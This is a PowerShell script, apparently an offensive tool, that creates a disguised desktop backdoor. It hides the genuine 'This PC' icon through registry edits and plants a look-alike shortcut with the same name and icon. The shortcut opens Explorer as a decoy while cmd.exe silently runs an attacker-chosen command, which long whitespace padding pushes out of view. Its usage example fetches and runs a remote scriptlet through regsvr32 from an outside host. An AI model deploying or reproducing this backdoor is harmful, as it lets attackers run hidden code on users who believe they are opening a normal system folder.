Function LNK_backdoor{
<#
.SYNOPSIS
Function: LNK_backdoor
Author: Evi1cg (@evi1cg)
.DESCRIPTION
Shortcut Backdoor Creater
.PARAMETER Command
The Command to execute
.EXAMPLE
C:\PS> LNK_backdoor -Command "regsvr32.exe /u /s /i:http://evi1cg.me/scripts/calc.png scrobj.dll"
#>
    [CmdletBinding()]
    param
    (
        [Parameter(ParameterSetName = 'Command')]
        [string]$Command
    )
    ##HIDE Computer Icon
    $ErrorActionPreference = "SilentlyContinue"
    If ($Error) {$Error.Clear()}
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    If (Test-Path $RegistryPath) {
        $Res = Get-ItemProperty -Path $RegistryPath -Name "HideIcons"
        If (-Not($Res)) {
            New-ItemProperty -Path $RegistryPath -Name "HideIcons" -Value "0" -PropertyType DWORD -Force | Out-Null
        }
        $Check = (Get-ItemProperty -Path $RegistryPath -Name "HideIcons").HideIcons
        If ($Check -NE 0) {
            New-ItemProperty -Path $RegistryPath -Name "HideIcons" -Value "0" -PropertyType DWORD -Force | Out-Null
        }
    }
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons"
    If (-Not(Test-Path $RegistryPath)) {
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "HideDesktopIcons" -Force | Out-Null
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons" -Name "NewStartPanel" -Force | Out-Null
    }
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"
    If (-Not(Test-Path $RegistryPath)) {
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons" -Name "NewStartPanel" -Force | Out-Null
    }
    If (Test-Path $RegistryPath) {
    ## -- My Computer
        $Res = Get-ItemProperty -Path $RegistryPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
        If (-Not($Res)) {
            New-ItemProperty -Path $RegistryPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" -Value "1" -PropertyType DWORD -Force | Out-Null
        }
        $Check = (Get-ItemProperty -Path $RegistryPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}")."{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
        If ($Check -NE 1) {
            New-ItemProperty -Path $RegistryPath -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" -Value "1" -PropertyType DWORD -Force | Out-Null
        }
    }
    If ($Error) {$Error.Clear()}
    ##SHOW Computer Icon
    #set-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu' -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" -Value 0
    #set-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel' -Name "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" -Value 0
    #RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
    $Commandline = "/c explorer.exe /e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D} | "
    $Command = $Commandline + $Command
    $get_path=New-Object -ComObject WScript.Shell; 
    $path = $get_path.SpecialFolders.Item('Desktop')
    $WshShell = New-Object -comObject WScript.Shell
    $My_Computer = 17
    $Shell = new-object -comobject shell.application
    $NSComputer = $Shell.Namespace($My_Computer)
    $name = $NSComputer.self.name
    $Shortcut = $WshShell.CreateShortcut($path+"\"+$name+".lnk")
    $Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"
    $Shortcut.WindowStyle = 7
    $Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,15"
    $Shortcut.Arguments = '                                                                                                                                                                                                                                      '+ $Command
    $Shortcut.Save()
    refresh
}
Function refresh{
   $source = @"
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
namespace FileEncryptProject.Algorithm
{
  public class DesktopRefurbish
  {
    [DllImport("shell32.dll")]
    public static extern void SHChangeNotify(HChangeNotifyEventID wEventId, HChangeNotifyFlags uFlags, IntPtr dwItem1, IntPtr dwItem2);
    public static void DeskRef()
    {
      SHChangeNotify(HChangeNotifyEventID.SHCNE_ASSOCCHANGED, HChangeNotifyFlags.SHCNF_IDLIST, IntPtr.Zero, IntPtr.Zero);
    }
  }
  #region public enum HChangeNotifyFlags
  [Flags]
  public enum HChangeNotifyFlags
  {
    SHCNF_DWORD = 0x0003,
    SHCNF_IDLIST = 0x0000,
    SHCNF_PATHA = 0x0001,
    SHCNF_PATHW = 0x0005,
    SHCNF_PRINTERA = 0x0002,
    SHCNF_PRINTERW = 0x0006,
    SHCNF_FLUSH = 0x1000,
    SHCNF_FLUSHNOWAIT = 0x2000
  }
  #endregion//enum HChangeNotifyFlags
  #region enum HChangeNotifyEventID
  [Flags]
  public enum HChangeNotifyEventID
  {
    SHCNE_ALLEVENTS = 0x7FFFFFFF,
    SHCNE_ASSOCCHANGED = 0x08000000,
    SHCNE_ATTRIBUTES = 0x00000800,
    SHCNE_CREATE = 0x00000002,
    SHCNE_DELETE = 0x00000004,
    SHCNE_DRIVEADD = 0x00000100,
    SHCNE_DRIVEADDGUI = 0x00010000,
    SHCNE_DRIVEREMOVED = 0x00000080,
    SHCNE_EXTENDED_EVENT = 0x04000000,
    SHCNE_FREESPACE = 0x00040000,
    SHCNE_MEDIAINSERTED = 0x00000020,
    SHCNE_MEDIAREMOVED = 0x00000040,
    SHCNE_MKDIR = 0x00000008,
    SHCNE_NETSHARE = 0x00000200,
    SHCNE_NETUNSHARE = 0x00000400,
    SHCNE_RENAMEFOLDER = 0x00020000,
    SHCNE_RENAMEITEM = 0x00000001,
    SHCNE_RMDIR = 0x00000010,
    SHCNE_SERVERDISCONNECT = 0x00004000,
    SHCNE_UPDATEDIR = 0x00001000,
    SHCNE_UPDATEIMAGE = 0x00008000,
  }
  #endregion
}
"@
     Add-Type -TypeDefinition $source
    [FileEncryptProject.Algorithm.DesktopRefurbish]::DeskRef()
}